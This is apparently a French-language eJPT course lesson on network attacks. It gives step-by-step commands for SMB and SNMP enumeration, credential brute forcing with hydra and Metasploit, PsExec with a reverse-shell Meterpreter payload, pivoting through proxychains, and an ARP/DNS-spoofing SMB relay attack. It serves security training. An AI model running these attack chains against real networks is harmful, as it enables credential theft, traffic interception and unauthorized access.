# Network Attacks

Cette leçon couvre les techniques pratiques d'attaque réseau — énumération SMB/NetBIOS, énumération SNMP, pivoting à travers des systèmes compromis et attaques de relais SMB. Ce sont des compétences fondamentales pour le module de test d'intrusion réseau de l'eJPT.

> ⚠️ **Note** : Toutes les commandes supposent que vous opérez depuis une machine d'attaque **Kali Linux**. Remplacez les IPs et valeurs par les informations réelles de votre cible.

---

## 1. SMB & NetBIOS Enumeration

### Qu'est-ce que SMB ?

**SMB (Server Message Block)** fournit le partage de fichiers et d'imprimantes, des canaux nommés et la communication inter-processus (IPC). Il permet aux utilisateurs d'accéder aux fichiers sur des ordinateurs distants comme s'ils étaient locaux.

| Version SMB | Introduite Avec | Changements Clés |
|-------------|----------------|-----------------|
| **SMB 1.0** | Windows XP | Version originale — vulnérabilités critiques (EternalBlue) |
| **SMB 2.0/2.1** | Windows Vista / Server 2008 | Performances et sécurité améliorées |
| **SMB 3.0+** | Windows 8 / Server 2012 | Chiffrement, support multi-canal, améliorations pour la virtualisation |

**Ports clés** :
- **Port 445** — Trafic SMB direct (contourne NetBIOS)
- **Port 139** — SMB sur NetBIOS (requis pour la rétrocompatibilité)

### Qu'est-ce que NetBIOS ?

**NetBIOS (Network Basic Input/Output System)** est une API et un ensemble de protocoles réseau pour la communication sur les réseaux locaux. Il permet aux applications sur différents ordinateurs de se trouver et d'interagir.

| Service | Port | Protocole | Utilité |
|---------|------|-----------|---------|
| **Name Service (NetBIOS-NS)** | 137 | UDP/TCP | Enregistrer, désinscrire et résoudre des noms sur le LAN |
| **Datagram Service (NetBIOS-DGM)** | 138 | UDP | Communication sans connexion et diffusion |
| **Session Service (NetBIOS-SSN)** | 139 | TCP | Communication orientée connexion pour des transferts fiables |

> Windows moderne utilise principalement SMB avec DNS pour la résolution de noms, mais NetBIOS sur le port 139 reste activé pour la rétrocompatibilité.

---

### Flux de Travail d'Énumération SMB/NetBIOS

#### Étape 1 : Scan Nmap Initial

```bash
nmap -sV -sC -p 139,445 <target_ip>
```

#### Étape 2 : Scanner les Informations de Noms NetBIOS

```bash
# Scan NetBIOS
nbtscan <target_ip>

# Alternatif — interroger une IP spécifique
nmblookup -A <target_ip>
```

#### Étape 3 : Énumérer la Version du Protocole SMB

```bash
nmap -sV -p 445 --script=smb-protocols <target_ip>
```

La sortie indique quelles versions SMB sont acceptées (SMBv1, v2, v3).

#### Étape 4 : Vérifier le Niveau de Sécurité SMB

```bash
nmap -sV -p 445 --script=smb-security-mode <target_ip>
```

Chercher :
- **Signature de messages désactivée** — vulnérable aux attaques de relais
- **Niveau d'authentification** — accès anonyme/invité activé ?

#### Étape 5 : Trouver Tous les Scripts Nmap SMB

```bash
ls -al /usr/share/nmap/scripts/ | grep -e "smb"
```

#### Étape 6 : Tester la Connexion Anonyme avec smbclient

```bash
# Lister les partages disponibles anonymement
smbclient -L //<target_ip> -N

# Se connecter à un partage spécifique
smbclient //<target_ip>/<nom_partage> -N
```

`-N` = sans mot de passe (connexion anonyme). En cas de succès, vous pouvez voir tous les noms de partages.

#### Étape 7 : Énumérer les Utilisateurs SMB

Si SMBv1 est actif et l'accès anonyme est autorisé :

```bash
nmap -sV -p 445 --script=smb-enum-users <target_ip>
```

Sauvegarder les noms d'utilisateurs découverts dans un fichier :

```bash
echo "admin
bob
administrator" > users.txt
```

#### Étape 8 : Force Brute des Identifiants SMB

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://<target_ip>
```

Ou avec Metasploit :

```bash
msfconsole
msf6 > use auxiliary/scanner/smb/smb_login
msf6 > set RHOSTS <target_ip>
msf6 > set USER_FILE users.txt
msf6 > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 > run
```

#### Étape 9 : Obtenir un Shell avec PsExec

```bash
msfconsole
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS <target_ip>
msf6 > set SMBUser <nom_utilisateur>
msf6 > set SMBPass <mot_de_passe>
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST <votre_ip>
msf6 > exploit
```

---

### Pivoting vers une Deuxième Cible

Une fois que vous avez une session Meterpreter sur la première machine, vous pouvez effectuer du pivoting pour atteindre des systèmes internes non accessibles directement depuis Kali.

#### Étape 1 : Découvrir la Deuxième Cible

```bash
meterpreter > shell
C:\> ping <target2_ip>
```

#### Étape 2 : Configurer la Route Réseau

```bash
meterpreter > run autoroute -s <sous_reseau_cible2>
# Exemple : run autoroute -s <target_network>/24
```

#### Étape 3 : Configurer le Proxy SOCKS

```bash
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > run -j
```

#### Étape 4 : Scanner la Cible 2 via le Tunnel

```bash
# Éditer /etc/proxychains.conf pour inclure :
# socks5 127.0.0.1 1080

proxychains nmap <target2_ip> -sT -Pn -sV -p 445
```

`-sT` (scan de connexion TCP) est requis via proxychains — les scans SYN ne fonctionnent pas via un proxy.

#### Étape 5 : Accéder aux Ressources Partagées de la Cible 2

```bash
# Depuis la première session meterpreter shell
meterpreter > shell

# Voir les ressources réseau partagées disponibles
C:\> net view \\<target2_ip>

# Mapper un partage distant sur une lettre de lecteur locale
C:\> net use D: \\<target2_ip>\<nom_partage>

# Parcourir le lecteur mappé
C:\> dir D:\
```

---

### Référence Rapide d'Énumération SMB

| Tâche | Commande |
|-------|---------|
| Scanner les ports SMB | `nmap -sV -p 139,445 <target_ip>` |
| Scan NetBIOS | `nbtscan <target_ip>` |
| Énumérer la version SMB | `nmap --script=smb-protocols -p 445 <target_ip>` |
| Vérifier le mode sécurité | `nmap --script=smb-security-mode -p 445 <target_ip>` |
| Énumérer les utilisateurs | `nmap --script=smb-enum-users -p 445 <target_ip>` |
| Lister les partages anonymement | `smbclient -L //<target_ip> -N` |
| Force brute des identifiants | `hydra -L users.txt -P rockyou.txt smb://<target_ip>` |
| Obtenir un shell via PsExec | `exploit/windows/smb/psexec` |

---

## 2. SNMP Enumeration

### Qu'est-ce que SNMP ?

**SNMP (Simple Network Management Protocol)** est un protocole largement utilisé pour surveiller et gérer les appareils en réseau — routeurs, commutateurs, serveurs, imprimantes. Il permet aux administrateurs d'interroger l'état des appareils, de configurer des paramètres et de recevoir des alertes.

**Architecture** :

| Composant | Rôle |
|-----------|------|
| **Gestionnaire SNMP** | Système qui interroge et interagit avec les agents SNMP |
| **Agent SNMP** | Logiciel sur les appareils réseau qui répond aux requêtes et envoie des traps |
| **MIB (Management Information Base)** | Base de données hiérarchique définissant les données disponibles — chaque entrée a un **OID (Object Identifier)** unique |

**Versions SNMP** :

| Version | Authentification | Sécurité |
|---------|-----------------|---------|
| **v1** | Chaînes de communauté (texte clair) | Faible — sans chiffrement |
| **v2c** | Chaînes de communauté (texte clair) | Transferts en masse améliorés, toujours faible |
| **v3** | Authentification basée utilisateur | Chiffrement + intégrité des messages — plus sécurisé |

**Ports clés** :
- **Port 161 (UDP)** — Requêtes SNMP
- **Port 162 (UDP)** — Traps SNMP (notifications envoyées au gestionnaire)

**Chaînes de communauté par défaut** (agissent comme mots de passe) :
- `public` — accès en lecture seule (le plus courant par défaut)
- `private` — accès en lecture/écriture

> En test d'intrusion, deviner ou forcer les chaînes de communauté est souvent la première étape — elles donnent accès à toutes les données SNMP de l'appareil.

---

### Flux de Travail d'Énumération SNMP

#### Étape 1 : Détecter SNMP avec Nmap

```bash
nmap -sU -p 161 <target_ip>
```

Scan UDP requis — SNMP fonctionne sur UDP 161.

#### Étape 2 : Force Brute des Chaînes de Communauté

```bash
nmap -sU -p 161 --script=snmp-brute <target_ip>
```

Ou avec Metasploit :

```bash
msfconsole
msf6 > use auxiliary/scanner/snmp/snmp_login
msf6 > set RHOSTS <target_ip>
msf6 > run
```

#### Étape 3 : Extraire des Informations avec snmpwalk

```bash
# Parcourir l'arbre SNMP complet
snmpwalk -v <version> -c <chaine_communaute> <target_ip>

# Exemple avec v1 et chaîne de communauté "public"
snmpwalk -v 1 -c public <target_ip>

# Exemple avec v2c
snmpwalk -v 2c -c public <target_ip>
```

**OIDs clés pour le pentesting** :

| OID | Informations Obtenues |
|-----|-----------------------|
| `1.3.6.1.2.1.1` | Infos système (hostname, OS, uptime) |
| `1.3.6.1.2.1.25.4.2.1.2` | Processus en cours d'exécution |
| `1.3.6.1.2.1.25.6.3.1.2` | Logiciels installés |
| `1.3.6.1.2.1.6.13.1.3` | Ports TCP ouverts |
| `1.3.6.1.4.1.77.1.2.25` | Comptes utilisateurs Windows |

#### Étape 4 : Exécuter Tous les Scripts SNMP de Nmap

```bash
nmap -sU -p 161 --script snmp-* <target_ip> > snmp_info.txt
```

Cela extrait tout ce que SNMP expose — infos système, utilisateurs, processus, interfaces réseau, logiciels installés.

#### Étape 5 : Exploiter les Données SNMP pour des Attaques Ultérieures

Après avoir extrait des noms d'utilisateurs via SNMP :

```bash
# Force brute avec les noms d'utilisateurs découverts
hydra -L snmp_users.txt -P /usr/share/wordlists/rockyou.txt smb://<target_ip>

# Ou utiliser le module PsExec de Metasploit avec les identifiants trouvés
msf6 > use exploit/windows/smb/psexec
```

---

### Référence Rapide d'Énumération SNMP

| Tâche | Commande |
|-------|---------|
| Détecter SNMP | `nmap -sU -p 161 <target_ip>` |
| Force brute des chaînes de communauté | `nmap -sU -p 161 --script=snmp-brute <target_ip>` |
| Parcourir l'arbre SNMP | `snmpwalk -v 1 -c public <target_ip>` |
| Exécuter tous les scripts SNMP | `nmap -sU -p 161 --script snmp-* <target_ip>` |
| Extraire les utilisateurs (Windows) | OID `1.3.6.1.4.1.77.1.2.25` via snmpwalk |

---

## 3. SMB Relay Attack

### Qu'est-ce qu'une Attaque de Relais SMB ?

Une **attaque de relais SMB** est une attaque Man-in-the-Middle (MitM) où l'attaquant intercepte le trafic d'authentification SMB, capture les hashes NTLM et les **relaie** vers un autre serveur pour obtenir un accès non autorisé — sans jamais avoir besoin de craquer le hash.

```
Client → [envoie le hash NTLM pour se connecter au serveur] → L'attaquant intercepte
Attaquant → relaie le hash au Serveur Cible → obtient l'accès comme le client
```

**Pourquoi ça fonctionne** : L'authentification NTLM est basée sur un défi-réponse. Le hash lui-même suffit pour s'authentifier — pas besoin du mot de passe en clair.

**Prérequis** :
- Signature SMB **désactivée** sur la cible (vérifier avec le script `smb-security-mode`)
- L'attaquant peut intercepter le trafic (ARP spoofing, empoisonnement DNS, ou serveur rogue)

---

### Flux de Travail de l'Attaque de Relais SMB

#### Étape 1 : Configurer le Relais SMB dans Metasploit

```bash
msfconsole
msf6 > use exploit/windows/smb/smb_relay
msf6 > set SRVHOST <votre_ip>
msf6 > set LHOST <votre_ip>
msf6 > set SMBHOST <ip_cible_finale>
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > exploit -j
```

Cela configure un serveur SMB rogue attendant de capturer et relayer les hashes NTLM.

#### Étape 2 : Créer des Enregistrements d'Empoisonnement DNS

Créer un fichier pointant le domaine cible vers votre machine :

```bash
echo "<votre_ip> *.domaine-cible.com" > dns_records
```

#### Étape 3 : Activer le Transfert IP

Nécessaire pour que le trafic légitime continue de circuler pendant l'interception :

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

#### Étape 4 : Démarrer l'Empoisonnement DNS

```bash
dnsspoof -i eth1 -f dns_records
```

Falsifie les réponses DNS — quand la victime recherche le domaine cible, DNS retourne votre IP.

#### Étape 5 : Configurer l'ARP Spoofing (Deux Terminaux)

L'empoisonnement ARP vous positionne entre la victime et la passerelle :

```bash
# Terminal 1 — empoisonner le cache ARP de la victime
arpspoof -i eth1 -t <victim_ip> <gateway_ip>

# Terminal 2 — empoisonner le cache ARP de la passerelle
arpspoof -i eth1 -t <gateway_ip> <victim_ip>
```

**Comment fonctionne la chaîne d'attaque complète** :
1. ARP spoofing → tout le trafic de la victime passe par votre machine.
2. DNS spoofing → la connexion SMB de la victime au domaine cible est redirigée vers votre serveur rogue.
3. Module SMB relay → capture le hash NTLM et le relaie au serveur cible réel.
4. Vous obtenez une session Meterpreter sur le serveur cible authentifié en tant que la victime.

#### Étape 6 : Vérifier et Utiliser la Session

```bash
msf6 > sessions -l
msf6 > sessions -i <session_id>
meterpreter > getuid
meterpreter > sysinfo
```

---

### Résumé de l'Attaque de Relais SMB

| Étape | Outil | Utilité |
|-------|-------|---------|
| **Configurer le relais** | Metasploit `smb_relay` | Serveur SMB rogue pour capturer/relayer les hashes NTLM |
| **Activer le transfert IP** | `echo 1 > /proc/sys/net/ipv4/ip_forward` | Permettre au trafic de passer par la machine attaquante |
| **Empoisonnement DNS** | `dnsspoof` | Rediriger les requêtes de domaine de la victime vers l'attaquant |
| **ARP spoofing** | `arpspoof` | Positionner l'attaquant entre la victime et la passerelle |
| **Résultat** | Session Meterpreter | Accès authentifié en tant qu'utilisateur victime |

---

## Points Clés

- **SMB** opère sur les ports **445** (direct) et **139** (sur NetBIOS) — scannez toujours les deux.
- **SMBv1** est dangereux — supporte l'énumération anonyme et est vulnérable à EternalBlue. Identifiez-le avec `smb-protocols`.
- La **connexion SMB anonyme** (`smbclient -L //<ip> -N`) révèle les partages et, combinée à `smb-enum-users`, expose les comptes utilisateurs.
- Vérifiez toujours le **mode de sécurité SMB** (`smb-security-mode`) — la signature de messages désactivée = vulnérable aux attaques de relais.
- **Pivoting** : utilisez `autoroute` + `socks_proxy` + `proxychains` pour atteindre des cibles internes via une machine compromise.
- En pivoting, utilisez **`-sT` (TCP connect)** avec proxychains — les scans SYN ne fonctionnent pas via des proxies SOCKS.
- Utilisez `net view` et `net use` sur la machine Windows compromise pour accéder aux partages des cibles internes.
- **SNMP** fonctionne sur le **port UDP 161** — utilisez toujours `-sU` pour le scanner.
- Les chaînes de communauté SNMP par défaut sont `public` (lecture) et `private` (écriture) — force brute avec `snmp-brute` ou `snmpwalk`.
- **`snmpwalk`** extrait les infos système, processus en cours, logiciels installés, ports ouverts et comptes utilisateurs.
- Exécutez tous les scripts SNMP en une fois : `nmap -sU -p 161 --script snmp-* <ip>` — sauvegardez la sortie pour l'analyse hors ligne.
- Les **attaques de relais SMB** interceptent les hashes NTLM et les rejouent — pas besoin de craquer les mots de passe.
- Le relais SMB nécessite : signature SMB **désactivée** sur la cible + position MitM (ARP + empoisonnement DNS).
- La chaîne d'attaque : `arpspoof` (MitM) → `dnsspoof` (rediriger le trafic) → `smb_relay` (capturer et relayer le hash NTLM) → session Meterpreter.
- Activez toujours le **transfert IP** (`echo 1 > /proc/sys/net/ipv4/ip_forward`) avant l'ARP spoofing pour ne pas couper le trafic de la victime.
